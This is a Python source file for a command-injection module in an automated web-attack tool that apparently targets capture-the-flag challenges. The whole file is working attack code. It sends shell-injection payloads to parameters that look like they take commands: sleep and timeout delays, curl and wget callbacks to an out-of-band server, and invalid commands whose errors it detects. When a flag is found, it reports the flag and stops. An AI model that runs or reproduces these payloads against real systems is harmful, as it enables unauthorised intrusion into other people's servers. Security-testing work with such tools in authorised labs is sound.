"""
Command Injection attack module.
Covers: time-based blind, OOB callback, error-based.
"""
from __future__ import annotations
import asyncio
import time

from attacks.base import BaseAttack
from engine.flag_hunter import has_definite_flag
from rich.console import Console

console = Console()

CMDI_PARAM_HINTS = [
    "cmd", "command", "exec", "execute", "run", "shell",
    "arg", "args", "input", "query", "ip", "host", "ping",
    "domain", "url", "dir", "path", "file", "process", "prog",
]

TIME_PAYLOADS = [
    "; sleep 3 #",
    "| sleep 3 #",
    "$(sleep 3)",
    "`sleep 3`",
    "; sleep 3 ;",
    "& timeout /t 3 &",
    "| timeout /t 3",
    "\nsleep 3\n",
]

OOB_PAYLOAD_TEMPLATES = [
    "; curl {url} ;",
    "| curl {url}",
    "$(curl -s {url})",
    "; wget -q -O /dev/null {url} ;",
]

ERROR_PAYLOADS = [
    "; invalidcmd_tweb123 ;",
    "| invalidcmd_tweb123",
    "$(invalidcmd_tweb123)",
    "`invalidcmd_tweb123`",
    "& invalidcmd_tweb123",
]

ERROR_SIGNATURES = [
    "not found", "command not found", "cannot find",
    "sh:", "bash:", "is not recognized",
    "no such file or directory", "permission denied",
]

# Serialize time-based tests globally — same pattern as sqli.py
_CMDI_SEM: asyncio.Semaphore | None = None


def _get_cmdi_sem() -> asyncio.Semaphore:
    global _CMDI_SEM
    if _CMDI_SEM is None:
        _CMDI_SEM = asyncio.Semaphore(1)
    return _CMDI_SEM


class CMDiAttack(BaseAttack):
    name = "cmdi"

    async def run(self, attack_point: dict, payloads: list[str]) -> list[dict]:
        url = attack_point["url"]
        param = attack_point.get("param", "")
        method = attack_point.get("method", "GET")

        if not param or not any(hint in param.lower() for hint in CMDI_PARAM_HINTS):
            return []

        console.print(f"  [cyan][CMDi][/cyan] {method} {url} ?{param}")
        all_findings = []

        extra_data = attack_point.get("extra_data", {})

        # Phase 1 — Time-based (most reliable, serialized)
        time_confirmed = False
        async with _get_cmdi_sem():
            baseline_time = 0.0
            try:
                t_b = time.monotonic()
                await self._try_payload(method, url, param, "", data=extra_data)
                baseline_time = time.monotonic() - t_b
            except Exception:
                pass

            for payload in TIME_PAYLOADS:
                if self._should_stop():
                    break
                t0 = time.monotonic()
                response, findings = await self._try_payload(method, url, param, payload, data=extra_data)
                elapsed = time.monotonic() - t0

                if response is None:
                    continue

                if elapsed >= 2.8 and (elapsed - baseline_time) >= 1.5:
                    console.print(
                        f"  [bold red][CMDi][/bold red] Time-based hit! "
                        f"({elapsed:.1f}s, baseline {baseline_time:.1f}s) Payload: {payload!r}"
                    )
                    all_findings.append({
                        "type": "cmdi_time_based",
                        "value": f"Command Injection ({elapsed:.1f}s) @ {url} param={param}",
                        "confidence": 0.85,
                    })
                    time_confirmed = True

                    flag = has_definite_flag(findings)
                    if flag:
                        console.print(f"  [bold green][CMDi][/bold green] FLAG: {flag}")
                        all_findings.extend([f for f in findings if f.get("confidence", 0) >= 1.0])
                        self.stop_event.set()
                        return all_findings
                    break

        # Phase 2 — OOB (blind detection via callback server)
        if not time_confirmed and self.oob:
            token = self.oob.generate_token("cmdi")
            oob_url = f"{self.oob.public_url}/{token}"
            for tpl in OOB_PAYLOAD_TEMPLATES:
                if self._should_stop():
                    break
                oob_payload = tpl.format(url=oob_url)
                await self._try_payload(method, url, param, oob_payload, data=extra_data)
                await asyncio.sleep(1.5)
                if self.oob.was_triggered(token):
                    info = self.oob.get_hit_info(token)
                    console.print(
                        f"  [bold red][CMDi][/bold red] OOB hit! "
                        f"Source IP: {info.get('source_ip')} Payload: {oob_payload!r}"
                    )
                    all_findings.append({
                        "type": "cmdi_oob",
                        "value": (
                            f"Blind CMDi @ {url} param={param} "
                            f"(OOB from {info.get('source_ip')})"
                        ),
                        "confidence": 0.95,
                    })
                    return all_findings

        # Phase 3 — Error-based (last resort)
        if not time_confirmed:
            for payload in ERROR_PAYLOADS:
                if self._should_stop():
                    break
                response, findings = await self._try_payload(method, url, param, payload, data=extra_data)
                if response is None:
                    continue

                body_lower = response.text.lower()
                if any(sig in body_lower for sig in ERROR_SIGNATURES):
                    console.print(
                        f"  [bold red][CMDi][/bold red] Error-based hit! Payload: {payload!r}"
                    )
                    all_findings.append({
                        "type": "cmdi_error",
                        "value": f"CMDi error @ {url} param={param} payload={payload!r}",
                        "confidence": 0.75,
                    })
                    flag = has_definite_flag(findings)
                    if flag:
                        console.print(f"  [bold green][CMDi][/bold green] FLAG: {flag}")
                        all_findings.extend([f for f in findings if f.get("confidence", 0) >= 1.0])
                        self.stop_event.set()
                    break

        # Extra payloads from skills/payloads file
        if not all_findings and payloads:
            for payload in payloads:
                if self._should_stop():
                    break
                response, findings = await self._try_payload(method, url, param, payload, data=extra_data)
                if response is None:
                    continue
                flag = has_definite_flag(findings)
                if flag:
                    console.print(f"  [bold green][CMDi][/bold green] FLAG via extra payload: {flag}")
                    all_findings.extend([f for f in findings if f.get("confidence", 0) >= 1.0])
                    self.stop_event.set()
                    return all_findings

        return all_findings
